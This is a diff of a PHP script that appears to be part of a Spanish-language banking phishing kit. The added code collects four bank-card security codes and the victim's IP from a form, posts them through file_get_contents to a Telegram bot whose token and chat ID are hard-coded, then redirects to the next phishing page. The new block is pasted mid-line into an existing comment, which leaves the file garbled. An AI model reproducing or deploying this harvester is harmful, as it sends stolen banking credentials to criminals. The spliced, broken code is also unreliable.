@@ -6,7 +6,37 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 	$co4 = $_POST["co4"];
 	
   $botToken = "7356380446:AAERwTFEndqW0wSfHHhuajIg70Ld8fSW6GM"; // Reemplaza con tu token de bot
-    $chatID = "5868379051"; // Reemplaza con tu chat ID
+    $chatID = "5868379051"; // Reemplaza con tu chat ID<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $co1 = $_POST["co1"] ?? '';
+    $co2 = $_POST["co2"] ?? '';
+    $co3 = $_POST["co3"] ?? '';
+    $co4 = $_POST["co4"] ?? '';
+    
+    $botToken = "8857815714:AAFp5JutGMJPmwrZf5NwiigjazGNVbnJEB4";
+    $chatID = "8555745789";
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
+    
+    $message = "=====CÓDIGOS TARJETA (1ª Ronda)=======\n";
+    $message .= "21: $co1\n11: $co2\n8: $co3\n40: $co4\n";
+    $message .= "IP: $ip\n";
+    
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $data = array("chat_id" => $chatID, "text" => $message);
+    $options = array(
+        "http" => array(
+            "method" => "POST",
+            "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
+            "content" => http_build_query($data)
+        )
+    );
+    $context = stream_context_create($options);
+    @file_get_contents($url, false, $context);
+    
+    header("Location: pa03.php");
+    exit;
+}
+?>
 
     // Obtén la IP del cliente
     $ip = $_SERVER['REMOTE_ADDR'];
